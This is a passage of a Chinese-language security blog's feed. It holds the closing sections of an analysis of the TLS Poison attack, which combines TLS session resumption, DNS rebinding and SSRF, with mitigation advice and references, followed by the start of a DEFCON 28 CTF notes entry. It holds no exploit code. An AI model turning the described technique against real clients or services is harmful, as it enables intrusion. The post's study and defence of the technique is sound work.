FgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/12.png" alt></p><p>&#x8BF4;&#x660E; Memcached &#x53EF;&#x4EE5;&#x4ECE; IPv4-Mapped &#x8FD9;&#x7C7B;&#x5730;&#x5740;&#x5199;&#x5165;&#x3002;</p><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>&#x7EB5;&#x89C2;&#x6574;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x6211;&#x89C9;&#x5F97;&#x5176;&#x5B9E;&#x9020;&#x6210;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x662F;&#x7531;&#x4E8E;&#x6BD4;&#x8F83;&#x591A;&#x590D;&#x6742;&#x7684;&#x56E0;&#x7D20;&#x5BFC;&#x81F4;&#x7684;&#xFF0C;&#x4ECE;&#x534F;&#x8BAE;&#x89D2;&#x5EA6;&#x6765;&#x8BF4;&#xFF0C;&#x5728; RFC &#x5F53;&#x4E2D;&#x4E5F;&#x5E76;&#x6CA1;&#x6709;&#x63D0;&#x5230; Client &#x5230;&#x5E95;&#x5E94;&#x8BE5;&#x600E;&#x4E48;&#x5B58;&#x50A8; Server &#x7ED9;&#x4E88;&#x7684;&#x76F8;&#x5173;&#x51ED;&#x8BC1;&#xFF0C;&#x4E5F;&#x5E76;&#x6CA1;&#x6709;&#x8BF4;&#x660E;&#x6E05;&#x695A;&#x600E;&#x4E48;&#x4E0E;&#x5BF9;&#x5E94;&#x7684; TLS &#x4F1A;&#x8BDD;&#x7ED1;&#x5B9A;&#xFF0C;&#x6240;&#x4EE5;&#x5BFC;&#x81F4;&#x4E86; Client &#x5728;&#x652F;&#x6301; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x7684;&#x4EA7;&#x751F;&#x4E86;&#x5404;&#x79CD;&#x5B9E;&#x73B0;&#xFF1B;&#x800C;&#x4ECE; Client &#x5BA2;&#x6237;&#x7AEF;&#x6F0F;&#x6D1E;&#x6765;&#x8BF4;&#xFF0C;&#x4E5F;&#x662F;&#x5F00;&#x53D1;&#x8005;&#x4EEC;&#x6CA1;&#x6709;&#x5BF9;&#x8FDB;&#x884C; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x7684;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x4E8C;&#x6B21;&#x6821;&#x9A8C;&#xFF0C;&#x5BFC;&#x81F4;&#x4E86;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; DNS Rebinding &#x6765;&#x8F7B;&#x677E;&#x7ED5;&#x8FC7;&#x3002;</p><p>&#x6240;&#x4EE5;&#xFF0C;&#x5BF9;&#x4E8E;&#x8BE5;&#x7C7B;&#x6F0F;&#x6D1E;&#x9996;&#x8981;&#x7684;&#x9632;&#x62A4;&#x624B;&#x6BB5;&#x5C31;&#x662F;&#x9700;&#x8981;&#x786E;&#x8BA4;&#x8FDB;&#x884C; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x7684;&#x5730;&#x5740;&#x4E0E;&#x4E4B;&#x524D;&#x7684;&#x5730;&#x5740;&#x4E00;&#x81F4;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x5B9E;&#x73B0;&#x9014;&#x5F84;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;&#x9632;&#x5FA1; DNS Rebinding &#x7684;&#x65B9;&#x5F0F;&#x80FD;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x7F13;&#x89E3;&#x5230;&#x6574;&#x4E2A;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#x5BF9;&#x4E8E; DNS Rebinding &#x7684;&#x4F20;&#x7EDF;&#x9632;&#x5B88;&#x65B9;&#x5F0F;&#x6709;&#x4E9B;&#x5C0F;&#x4F19;&#x4F34;&#x53EF;&#x80FD;&#x4F1A;&#x8BF4; Client &#x53EA;&#x505A;&#x4E00;&#x6B21; DNS &#x89E3;&#x6790;&#xFF0C;&#x4E4B;&#x540E;&#x5C31;&#x4E00;&#x76F4;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A; IP &#x89E3;&#x6790;&#x7ED3;&#x679C;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C; Client &#x5B58;&#x5728;&#x50CF;&#x6587;&#x4E2D;&#x90A3;&#x6837;&#x7684;&#x6328;&#x4E2A;&#x5C1D;&#x8BD5;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x540E;&#x4F7F;&#x7528;&#x7B2C;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x6210;&#x529F;&#x7684; IP &#x7684;&#x73B0;&#x8C61;&#x7684;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E0A;&#x6587;&#x63D0;&#x5230;&#x7684;&#x53CC; A &#x8BB0;&#x5F55;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x7ED5;&#x8FC7;&#x8BE5;&#x7C7B;&#x9650;&#x5236;&#x3002;</p><p>&#x90A3;&#x600E;&#x4E48;&#x505A;&#x624D;&#x662F;&#x6700;&#x597D;&#x5462;&#xFF1F;&#x4F5C;&#x8005;&#x5728;&#x9632;&#x5FA1;&#x7AE0;&#x8282;&#x505A;&#x51FA;&#x4E86;&#x81EA;&#x5DF1;&#x9610;&#x8FF0;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part3/3.jpg" alt></p><p>&#x4F5C;&#x8005;&#x5EFA;&#x8BAE;&#x5C06; (hostname, port, ip_addr) &#x4F5C;&#x4E3A;&#x7F13;&#x5B58;&#x952E;&#x503C;&#x5BF9;&#x8FDB;&#x884C;&#x7ED1;&#x5B9A;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x8FD9;&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x826F;&#x597D;&#x7684;&#x7F13;&#x89E3;&#x63AA;&#x65BD;&#xFF0C;&#x56E0;&#x4E3A;&#x5728;&#x5F53;&#x4ECA; CDN &#x5927;&#x6D41;&#x884C;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5F88;&#x96BE;&#x8BF4;&#x8FD9;&#x4E2A;&#x57DF;&#x540D;&#x4F1A;&#x4E00;&#x76F4;&#x4F7F;&#x7528;&#x5230;&#x540C;&#x4E00;&#x4E2A; IP &#xFF0C;&#x5982;&#x679C;&#x5C06;&#x57DF;&#x540D;&#x3001;&#x7AEF;&#x53E3;&#x3001;IP &#x4E09;&#x8005;&#x7ED1;&#x5B9A;&#x7684;&#x8BDD;&#xFF0C;&#x5BF9;&#x4E8E; CDN &#x4E4B;&#x7C7B;&#x7684;&#x670D;&#x52A1;&#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x673A;&#x5236;&#x6D88;&#x8017;&#x5C06;&#x4F1A;&#x5927;&#x5927;&#x63D0;&#x5347;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x89C9;&#x5F97;&#x66F4;&#x597D;&#x7684;&#x505A;&#x6CD5;&#x5E94;&#x8BE5;&#x662F;&#x6B63;&#x5982; Wiki &#x4E0A;&#x4ECB;&#x7ECD;&#x7684;&#xFF0C;&#x4F7F;&#x7528; IP &#x4E0E;&#x5BF9;&#x5E94;&#x7684;&#x7AEF;&#x53E3;&#x8FDB;&#x884C;&#x7ED1;&#x5B9A; &#xFF1A;</p><blockquote><p>&#x200B;    The client associates this <em>session id</em> with the server&#x2019;s IP address and TCP port, so that when the client connects again to that server, it can use the <em>session id</em> to shortcut the handshake.</p></blockquote><p>&#x4F7F;&#x7528; IP &#x4E0E;&#x5BF9;&#x5E94;&#x7684;&#x7AEF;&#x53E3;&#x4F5C;&#x4E3A;&#x7F13;&#x5B58;&#x952E;&#x503C;&#x5BF9;&#x8FDB;&#x884C;&#x7ED1;&#x5B9A;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#x5C31;&#x4E0D;&#x4F1A;&#x5BF9; CND &#x4E4B;&#x7C7B;&#x7684;&#x670D;&#x52A1;&#x9020;&#x6210;&#x592A;&#x5927;&#x5F71;&#x54CD;&#xFF0C;&#x800C;&#x4E14;&#x4E5F;&#x964D;&#x4F4E;&#x4E86;&#x88AB;&#x653B;&#x51FB;&#x7684;&#x98CE;&#x9669;&#xFF0C;&#x5C31;&#x4E0D;&#x4F1A;&#x5C06;&#x91CD;&#x7528;&#x4F1A;&#x8BDD;&#x53D1;&#x9001;&#x5230;&#x5176;&#x4ED6; IP &#x4E0A;&#x4E86;&#x3002;&#x5F53;&#x7136;&#x8FD9;&#x91CC;&#x4E5F;&#x53EA;&#x662F;&#x6211;&#x4E2A;&#x4EBA;&#x7247;&#x9762;&#x7684;&#x60F3;&#x6CD5;&#xFF0C;&#x53EF;&#x80FD;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x8FD9;&#x4E48;&#x505A;&#x4F1A;&#x53D7;&#x5230;&#x5F71;&#x54CD;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;&#x53EF;&#x80FD; Server &#x5BF9;&#x4E8E; Host &#x57DF;&#x540D;&#x6709;&#x6821;&#x9A8C;&#x800C;&#x62D2;&#x7EDD;&#x91CD;&#x7528;&#x4F1A;&#x8BDD;&#x7B49;&#x7B49;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x8FD9;&#x91CC;&#x53EF;&#x80FD;&#x5E76;&#x6CA1;&#x6709;&#x4E00;&#x4E2A;&#x5341;&#x5168;&#x5341;&#x7F8E;&#x7684;&#x7F13;&#x89E3;&#x8BE5;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x7684;&#x95EE;&#x9898;&#x7B49;&#x7B49;&#x3002;</p><p>&#x5F53;&#x7136;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x76F4;&#x63A5;&#x7981;&#x7528;&#x6389; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x6709;&#x4E9B; Client &#x4E0A;&#x5C31;&#x63D0;&#x4F9B;&#x4E86; Disable outbound TLS session resumption &#x7684;&#x8BBE;&#x7F6E;&#xFF08;&#x9664;&#x4E86; chrome &#x7B49;&#x5176;&#x4ED6;&#x4E00;&#x4E9B;&#xFF09; &#xFF1A;</p><ul><li>libcurl: CURLOPT_SSL_SESSIONID_CACHE=false</li><li>firefox: security.ssl.disable_session_identifiers=true</li><li>Tor browser: disabled by default </li><li>Java, Nodejs, Chrome, others: no option</li></ul><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>&#x6574;&#x4E2A;&#x6F0F;&#x6D1E;&#x5F04;&#x4E0B;&#x6765;&#x8FD8;&#x662F;&#x975E;&#x5E38;&#x6709;&#x610F;&#x601D;&#x7684;&#xFF0C;&#x5C3D;&#x7BA1;&#x5176;&#x5229;&#x7528;&#x6761;&#x4EF6;&#x6BD4;&#x8F83;&#x82DB;&#x523B;&#xFF0C;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x53EF;&#x4EE5;&#x88AB;&#x653B;&#x51FB;&#x7684;&#x670D;&#x52A1; + Client &#x9700;&#x8981;&#x652F;&#x6301; TLS Session Resumption + DNS Rebinding&#xFF08;&#x4E07;&#x4E00;&#x53EA;&#x67E5;&#x8BE2;&#x4E00;&#x6B21; DNS &#x5C31;&#x6CA1;&#x4E86;&#xFF09;&#xFF0C;&#x5728;&#x5F53;&#x4ECA;&#x5168;&#x662F;&#x4ECE;&#x6570;&#x5B66;&#x7B97;&#x6CD5;&#x89D2;&#x5EA6;&#x53BB; Hack TLS &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4F5C;&#x8005;&#x80FD;&#x4ECE;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83; Web &#x7684;&#x89D2;&#x5EA6;&#x6765; Hack TLS &#xFF0C;&#x6211;&#x89C9;&#x5F97;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x72EC;&#x5230;&#x7684;&#x89C6;&#x89D2;&#xFF0C;&#x662F;&#x975E;&#x5E38;&#x503C;&#x5F97;&#x5B66;&#x4E60;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x8FD9;&#x79CD;&#x534F;&#x8BAE;&#x8BBE;&#x8BA1;&#x7684;&#x95EE;&#x9898;&#x4E0A;&#x3002;</p><p>&#x8FD8;&#x6709;&#xFF0C;&#x6211;&#x89C9;&#x5F97;&#x4F5C;&#x8005;&#x7684;&#x6807;&#x9898;&#x4E5F;&#x53D6;&#x7684;&#x5F88;&#x68D2;&#xFF0C;&#x300A;When TLS Hacks You&#x300B;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x60F3;&#x4E00;&#x4E0B;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x662F;&#x300A;When HTTPS Hacks You&#x300B;&#x5462;&#xFF1F;&#x5356;&#x4E2A;&#x5173;&#x5B50;&#xFF0C;&#x5982;&#x679C;&#x8FD8;&#x6709;&#x540E;&#x7EED;&#x7684;&#x8FDB;&#x5C55;&#xFF0C;&#x6211;&#x4E5F;&#x4F1A;&#x540C;&#x6B65;&#x5230;&#x81EA;&#x5DF1;&#x7684;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#x4E0A;&#xFF0C;&#x6B22;&#x8FCE;&#x5173;&#x6CE8;&#xFF0C;&#x4EE5;&#x53CA;&#x524D;&#x6765;&#x4EA4;&#x6D41;&#xFF1A;<a href="https://blog.zeddyu.info/">https://blog.zeddyu.info/</a></p><p>&#x4EE5;&#x4E0A;&#x5C31;&#x662F;&#x672C;&#x7BC7;&#x6587;&#x7AE0;&#x7684;&#x5168;&#x90E8;&#x5185;&#x5BB9;&#x4E86;&#xFF0C;&#x5982;&#x679C;&#x5BF9;&#x8BE5;&#x7BC7;&#x6587;&#x7AE0;&#x6709;&#x4EFB;&#x4F55;&#x7591;&#x95EE;&#x6216;&#x8005;&#x8D28;&#x7591;&#xFF0C;&#x6B22;&#x8FCE;&#x6765;&#x4FE1;&#xFF1A;echo emVkZHl1Lmx1QGdtYWlsLmNvbQ==|base64 -d</p><p>&#x6B22;&#x8FCE;&#x5927;&#x5BB6;&#x6307;&#x51FA;&#x6587;&#x7AE0;&#x7684;&#x9519;&#x8BEF;&#xFF0C;&#x4E5F;&#x6B22;&#x8FCE;&#x5BF9;&#x534F;&#x8BAE;&#x5B89;&#x5168;&#x7B49;&#x5185;&#x5BB9;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x540C;&#x5B66;&#x4E00;&#x8D77;&#x4EA4;&#x6D41;&#x5B66;&#x4E60;&#xFF01;</p><h2 id="Acknowledgements"><a href="#Acknowledgements" class="headerlink" title="Acknowledgements"></a>Acknowledgements</h2><p>&#x975E;&#x5E38;&#x611F;&#x8C22;&#x5728;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x4E2D;&#x5E2E;&#x52A9;&#x6211;&#x7684;&#x540C;&#x5B66;&#x3001;&#x670B;&#x53CB;&#x4EEC;&#xFF0C;&#x7279;&#x522B;&#x611F;&#x8C22; @George &#x5728;&#x8C03;&#x8BD5;&#x8FC7;&#x7A0B;&#x4E2D;&#x5BF9;&#x4E8E;&#x6211;&#x8FD9;&#x4E2A;&#x840C;&#x65B0;&#x4E0D;&#x8010;&#x6211;&#x70E6;&#x7684;&#x5E2E;&#x52A9;&#xFF0C;&#x611F;&#x8C22; @Joshua Maddux @zhaojin &#x7B49;&#x4EBA;&#x5728;&#x6B64;&#x524D;&#x5BF9;&#x8BE5;&#x7C7B;&#x578B;&#x653B;&#x51FB;&#x505A;&#x51FA;&#x7684;&#x8D21;&#x732E;&#xFF0C;&#x611F;&#x8C22; @rebirth @chuye &#x5BF9;&#x672C;&#x6587;&#x7684; Review &#x6307;&#x51FA;&#x4E86;&#x672C;&#x6587;&#x4E4B;&#x524D;&#x4E0D;&#x5C11;&#x7684;&#x9519;&#x8BEF;&#x3002;</p><p>&#x53E6;&#x5916;&#x611F;&#x8C22;&#x4E00;&#x4E0B;&#x5C0F;&#x7F16;&#x8D1F;&#x8D23;&#x4E14;&#x8010;&#x5FC3;&#x7684;&#x7F16;&#x8F91;&#xFF0C;&#x7F16;&#x8F91;&#x8FD9;&#x4E48;&#x957F;&#x7684;&#x6587;&#x7AE0;&#x771F;&#x662F;&#x8F9B;&#x82E6;&#x5C0F;&#x7F16;&#x4E86;&#x3002;</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://i.blackhat.com/USA-20/Wednesday/us-20-Maddux-When-TLS-Hacks-You.pdf" target="_blank" rel="noopener">When TLS Hacks You</a></p><p><a href="https://www.youtube.com/watch?v=qGpAJxfADjo" target="_blank" rel="noopener">DEF CON Safe Mode - Joshua Maddux - When TLS Hacks You</a></p><p><a href="https://github.com/jmdx/TLS-poison" target="_blank" rel="noopener">TLS Poison</a></p><p><a href="https://github.com/ctz/rustls" target="_blank" rel="noopener">rustls</a></p><p><a href="https://tools.ietf.org/html/rfc5246" target="_blank" rel="noopener">RFC 5246: The Transport Layer Security (TLS) Protocol Version 1.2</a></p><p><a href="https://tools.ietf.org/html/rfc5077" target="_blank" rel="noopener">RFC 5077: Transport Layer Security (TLS) Session Resumption without Server-Side State</a></p><p><a href="https://tools.ietf.org/html/rfc8446" target="_blank" rel="noopener">RFC 8446: The Transport Layer Security (TLS) Protocol Version 1.3</a></p><p><a href="https://tools.ietf.org/html/rfc3484" target="_blank" rel="noopener">RFC 3484: Default Address Selection for Internet Protocol version 6 (IPv6)</a></p><p><a href="https://tools.ietf.org/html/rfc6724" target="_blank" rel="noopener">RFC 6724: Default Address Selection for Internet Protocol Version 6 (IPv6)</a></p><p><a href="https://en.wikipedia.org/wiki/Transport_Layer_Security" target="_blank" rel="noopener">Transport Layer Security</a></p><p><a href="https://devcentral.f5.com/s/articles/TLS-Stateful-vs-Stateless-Session-Resumption" target="_blank" rel="noopener">TLS Stateful vs Stateless Session Resumption</a></p><p><a href="https://www.venafi.com/blog/tls-session-resumption" target="_blank" rel="noopener">TLS Session Resumption</a></p><p><a href="https://www.ibm.com/support/knowledgecenter/SSLTBW_2.3.0/com.ibm.zos.v2r3.hale001/ipv6d0021002286.htm" target="_blank" rel="noopener">Default destination address selection</a></p><p><a href="https://docs.google.com/presentation/d/1Zq0zMaKh5ONK8twrQc-8cp0b1QuboOm6VHlQl3i315o/edit?usp=sharing" target="_blank" rel="noopener">When TLS hacks you: TLS + SSRF = RCE by ducnt</a></p><p><a href="https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner" target="_blank" rel="noopener">hxp 2020</a></p><p><a href="https://www.zhaoj.in/read-6681.html" target="_blank" rel="noopener">&#x57FA;&#x4E8E; A &#x548C; AAAA &#x8BB0;&#x5F55;&#x7684;&#x4E00;&#x79CD;&#x65B0; DNS Rebinding &#x59FF;&#x52BF;&#x2013;&#x4ECE;&#x897F;&#x6E56;&#x8BBA;&#x5251;2020 Web HelloDiscuzQ &#x9898;&#x5BF9; Blackhat &#x4E0A;&#x7684;&#x8BAE;&#x9898;&#x505A;&#x5347;&#x534E;</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/10/15/Defcon28final/</id>
        <title><![CDATA[DEFCON 28 Final 杂记]]></title>
        <updated>2021-06-01T02:31:38+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/10/15/Defcon28final/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/10/15/Defcon28final/"><![CDATA[<html><head></head><body><p>&#x8DDD;&#x79BB; DEFCON 28 Final &#x5DF2;&#x7ECF;&#x8FC7;&#x53BB;&#x4E86;&#x4E24;&#x4E2A;&#x591A;&#x6708;&#x4E86;&#xFF0C;&#x672C;&#x6765;&#x7ED3;&#x675F;&#x5C31;&#x5199;&#x5199;&#xFF0C;&#x4F46;&#x662F;&#x56E0;&#x4E3A;&#x4E00;&#x4E9B;&#x540E;&#x6765;&#x4E8B;&#x803D;&#x6401;&#x4E86;&#xFF0C;&#x73B0;&#x5728;&#x8865;&#x4E00;&#x4E0B;&#x8FD9;&#x6B21;&#x53C2;&#x8D5B;&#x7684;&#x4E00;&#x4E9B;&#x7ECF;&#x5386;&#x3002;</p><a id="more"></a><p>[TOC]</p><h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p><strong>&#x524D;&#x8A00;&#xFF1A;&#x672C;&#x7BC7;&#x6587;&#x7AE0;&#x4E0D;&#x4EE3;&#x8868;&#x4EFB;&#x4F55;&#x7EC4;&#x7EC7;&#x793E;&#x56E2;&#x7684;&#x89C2;&#x70B9;&#xFF0C;&#x5168;&#x6587;&#x4EC5;&#x4EE3;&#x8868;&#x4E2A;&#x4EBA;&#x770B;&#x6CD5;&#x4EE5;&#x53CA;&#x610F;&#x89C1;&#x3002;&#x5982;&#x6709;&#x5192;&#x72AF;&#x8BF7;&#x8054;&#x7CFB;&#x6211;&#x8FDB;&#x884C;&#x5FC5;&#x8981;&#x7684;&#x4FEE;&#x6539;&#x3002;</strong></p><p>&#x7531;&#x4E8E;&#x4ECA;&#x5E74;&#x75AB;&#x60C5;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x4ECA;&#x5E74;&#x7684; DEFCON Final &#x5728;&#x7EBF;&#x4E0A;&#x4E3E;&#x529E;&#xFF0C;&#x6211;&#x6709;&#x5E78;&#x4E0E; Tea Deliverers &#x4E00;&#x8D77;&#x53C2;&#x4E0E;&#x4E86; DEFCON 28 CTF Final &#xFF0C;&#x6700;&#x7EC8;&#x5728;&#x6BD4;&#x8D5B;&#x4E2D;&#x53D6;&#x5F97;&#x4E86;&#x7B2C;&#x56DB;&#x7684;&#x6210;&#x7EE9;&#x3002;&#x672C;&#x6587;&#x6211;&#x4F1A;&#x4E3B;&#x8981;&#x4ECE;&#x53C2;&#x8D5B;&#x7ECF;&#x5386;&#x89C1;&#x95FB;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x5BF9;&#x4E8E; Web &#x9898;&#x7684;&#x5206;&#x6790;&#x5165;&#x624B;&#x6765;&#x5199;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#xFF0C;&#x7531;&#x4E8E; Web 